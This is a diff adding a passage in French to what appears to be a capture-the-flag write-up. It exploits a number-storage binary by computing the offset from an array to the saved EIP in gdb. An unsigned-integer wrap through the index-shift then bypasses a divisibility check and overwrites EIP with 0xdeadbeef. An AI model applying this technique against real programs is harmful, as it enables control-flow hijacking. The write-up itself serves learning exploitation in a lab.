@@ -71,9 +71,66 @@ $2 = 36
 $3 = 9
 ```
 
-On obtiens l'index 9. N'oublions pas que la stack grandis vers des addresse plus petites, l'index `9` est en fait `-9`, ce qui fera wrapper l'int a `4294956356` soit `0xFFFFD544`: notre tableau.
+On obtiens l'index 9. `9 % 3 == 0` il faut donc contourner cette protection. Si nous prenons `-9`, on fait passer l'unsigned int a 4294956356 soit 0xFFFFD544: notre tableau.
 
+Calculons maintenant l'offset entre le tableau et l'eip enregistré:
 
+```
+=> eip at 0xffffd70c
+=> database is at 0xffffd544
+[...]
+(gdb) p 0xffffd70c - 0xffffd544
+456
+(gdb) p 456 / 4  <--- to int
+114
+```
+
+L'offset est de 114, vérifions:
+
+```
+Breakpoint 1, 0x080486dd in read_number ()
+(gdb) c
+Continuing.
+ Index: 114
+ Number at data[114] is 4158936339  <-- eip ?
+ Completed read command successfully
+(gdb) p/x 4158936339
+$10 = 0xf7e45513
+(gdb) x 0xf7e45513
+0xf7e45513 <__libc_start_main+243>:     0xe8240489
+```
+
+Problème: 114 est divisable par 3.
+
+On obseve ceci a la fin de la fonction `store_number`:
+
+```
+// index = index << 2; 
+// <+149>:   shl    eax,0x2
+database[index << 2] = nbr;
+```
+
+Ce qui equivaut a multiplier l'index donné par 4, ceci nous permet de faire wrapper l'unsigned int et d'inserer une valeur a l'index 114:
+
+On prend donc `(UINT_MAX / 4) + 114` soit  `4294967296 / 4 + 114` = `1,073,741,938`
+
+Essayons:
+
+```
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+[...]
+
+Input command: store
+ Number: 3735928559	(0xdeadbeef)
+ Index: 1073741938	(0xffffd70c)
+ Completed store command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()	<-- Nice
+```
 
 
 
